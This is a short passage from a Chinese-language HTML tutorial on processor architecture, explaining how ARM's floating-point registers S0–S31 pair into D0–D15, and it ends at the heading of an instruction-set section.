 <p>另外，在x86-64架构和ARM架构中都有很多的浮点数寄存器，用于进行浮点数计算。在ARM架构中，浮点数寄存器有32个32位寄存器<code>S0~S31</code>，其中可以两两组合访问为<code>D0~D15</code>，如<code>S0</code>和<code>S1</code>组合为<code>D0</code>。</p>
 <h1 id="2-指令集"><a class="markdownIt-Anchor" href="#2-指令集"></a> 2. 指令集</h1>
